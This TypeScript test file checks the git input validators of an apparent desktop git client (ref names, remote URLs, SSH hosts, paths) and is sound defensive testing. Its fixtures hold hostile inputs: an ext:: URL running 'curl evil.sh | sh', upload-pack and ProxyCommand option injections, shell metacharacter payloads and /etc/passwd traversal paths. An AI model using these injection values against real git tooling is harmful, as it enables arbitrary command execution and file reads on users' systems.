import { describe, expect, it } from "vitest";
import { GitError } from "@shared/errors";
import {
  assertAllowedRemoteUrl,
  assertNotOptionLike,
  assertPlainPath,
  assertRepositoryPath,
  assertValidObjectId,
  assertValidRefName,
  assertValidSshDestination,
  isValidRefName,
} from "@main/git/validation";

const throwsInvalidInput = (fn: () => void) => {
  expect(fn).toThrow(GitError);
  try {
    fn();
  } catch (error) {
    expect((error as GitError).kind).toBe("invalid-input");
  }
};

describe("isValidRefName", () => {
  it.each(["main", "feature/identity-switch", "release/v0.1.0", "fix-123", "users/eda/wip"])(
    "accepts %s",
    (ref) => {
      expect(isValidRefName(ref)).toBe(true);
    },
  );

  it.each([
    ["", "empty"],
    ["feature branch", "contains a space"],
    ["feature..branch", "contains .."],
    ["feature~1", "contains ~"],
    ["feature^", "contains ^"],
    ["feature:branch", "contains :"],
    ["feature?", "contains ?"],
    ["feature*", "contains *"],
    ["feature[1]", "contains ["],
    ["feature\\branch", "contains backslash"],
    ["main.lock", "ends with .lock"],
    [".hidden", "starts with a dot"],
    ["trailing.", "ends with a dot"],
    ["/leading", "starts with a slash"],
    ["trailing/", "ends with a slash"],
    ["double//slash", "contains //"],
    ["@", "is a bare @"],
    ["branch@{upstream}", "contains @{"],
    ["nested/.hidden", "has a component starting with a dot"],
    ["control\x01char", "contains a control character"],
  ])("rejects %s (%s)", (ref) => {
    expect(isValidRefName(ref)).toBe(false);
  });
});

describe("assertValidRefName", () => {
  it("rejects a ref that would be read as an option", () => {
    throwsInvalidInput(() => assertValidRefName("--upload-pack=evil", "checkout"));
  });

  it("names the operation in the error so the UI can say what failed", () => {
    try {
      assertValidRefName("bad ref", "create branch");
      expect.unreachable("should have thrown");
    } catch (error) {
      expect((error as GitError).operation).toBe("create branch");
      expect((error as GitError).suggestedAction).toBeDefined();
    }
  });
});

describe("assertNotOptionLike", () => {
  it("accepts an ordinary value", () => {
    expect(() => assertNotOptionLike("main", "checkout")).not.toThrow();
  });

  it("rejects a leading dash", () => {
    throwsInvalidInput(() => assertNotOptionLike("-f", "checkout"));
  });
});

describe("assertAllowedRemoteUrl", () => {
  it.each([
    "https://github.com/example-org/Eda.git",
    "ssh://git@github.com/example-org/Eda.git",
    "ssh://git@[::1]:2222/example-org/Eda.git",
    "file:///home/dev/repos/eda",
    "git@github.com:example-org/Eda.git",
    "dev@build-01.internal:/srv/git/repo",
  ])("accepts %s", (url) => {
    expect(() => assertAllowedRemoteUrl(url, "clone")).not.toThrow();
  });

  it("rejects the ext:: transport, which executes commands", () => {
    throwsInvalidInput(() => assertAllowedRemoteUrl('ext::sh -c "curl evil.sh | sh"', "clone"));
  });

  it.each([
    "ssh://git@host;whoami/repo",
    "ssh://git@$(whoami)/repo",
    "ssh://%60whoami%60@host/repo",
    "ssh://user%0Acommand@host/repo",
    "ssh://-option@host/repo",
    "ssh://git@-option/repo",
    "git@-option:repo",
  ])("rejects SSH destination metacharacters in %s", (url) => {
    throwsInvalidInput(() => assertAllowedRemoteUrl(url, "clone"));
  });

  it.each([
    "http://internal.example/repo.git",
    "git://example.com/repo.git",
    "ftp://example.com/repo.git",
    "javascript:alert(1)",
    "data:text/plain,hello",
  ])("rejects %s", (url) => {
    throwsInvalidInput(() => assertAllowedRemoteUrl(url, "clone"));
  });

  it("rejects an option-like URL", () => {
    throwsInvalidInput(() => assertAllowedRemoteUrl("--upload-pack=evil", "clone"));
  });

  it("rejects an empty URL", () => {
    throwsInvalidInput(() => assertAllowedRemoteUrl("   ", "clone"));
  });
});

describe("assertValidObjectId", () => {
  it("accepts full and abbreviated ids", () => {
    expect(() => assertValidObjectId("74a660c", "show")).not.toThrow();
    expect(() => assertValidObjectId("a".repeat(40), "show")).not.toThrow();
  });

  it("rejects a ref name in an object-id position", () => {
    throwsInvalidInput(() => assertValidObjectId("HEAD~1", "show"));
  });
});

describe("assertValidSshDestination", () => {
  it.each([
    "github.com",
    "git@github.com",
    "git@github.com:22",
    "build-01",
    "gitlab.internal.example.org",
    "dev@10.0.0.5",
  ])("accepts %s", (host) => {
    expect(() => assertValidSshDestination(host, "test connection")).not.toThrow();
  });

  it("rejects a ProxyCommand smuggled in as a host", () => {
    throwsInvalidInput(() =>
      assertValidSshDestination("-oProxyCommand=touch /tmp/pwned", "test connection"),
    );
  });

  it.each([
    "-F/tmp/evil_config",
    "--option=x",
    "host with spaces",
    "host;id",
    "host$(id)",
    "host`id`",
    "host&&id",
    "host|id",
    "host\nnewline",
    "",
  ])("rejects %s", (host) => {
    throwsInvalidInput(() => assertValidSshDestination(host, "test connection"));
  });

  it("rejects an out-of-range port", () => {
    throwsInvalidInput(() => assertValidSshDestination("github.com:0", "test connection"));
    throwsInvalidInput(() => assertValidSshDestination("github.com:99999", "test connection"));
  });
});

describe("assertPlainPath", () => {
  it("accepts an ordinary path", () => {
    expect(() => assertPlainPath("src/main/index.ts", "stage")).not.toThrow();
  });

  it("rejects a pathspec magic prefix", () => {
    throwsInvalidInput(() => assertPlainPath(":(exclude)src", "stage"));
  });

  it("rejects a null byte", () => {
    throwsInvalidInput(() => assertPlainPath("src/evil\0.ts", "stage"));
  });
});

describe("assertRepositoryPath", () => {
  it("accepts an ordinary relative path", () => {
    expect(() => assertRepositoryPath("src/main/index.ts", "stage changes")).not.toThrow();
  });

  it("rejects an absolute path", () => {
    throwsInvalidInput(() => assertRepositoryPath("/etc/passwd", "stage changes"));
    throwsInvalidInput(() => assertRepositoryPath("C:\\Windows\\system.ini", "stage changes"));
  });

  it("rejects a path that climbs out of the repository", () => {
    throwsInvalidInput(() => assertRepositoryPath("../../etc/passwd", "stage changes"));
    throwsInvalidInput(() => assertRepositoryPath("src/../../../etc/passwd", "stage changes"));
  });

  it("allows an option-like path, which the -- separator neutralizes", () => {
    expect(() => assertRepositoryPath("--output=/tmp/pwn", "stage changes")).not.toThrow();
    expect(() => assertRepositoryPath("-x", "stage changes")).not.toThrow();
  });
});
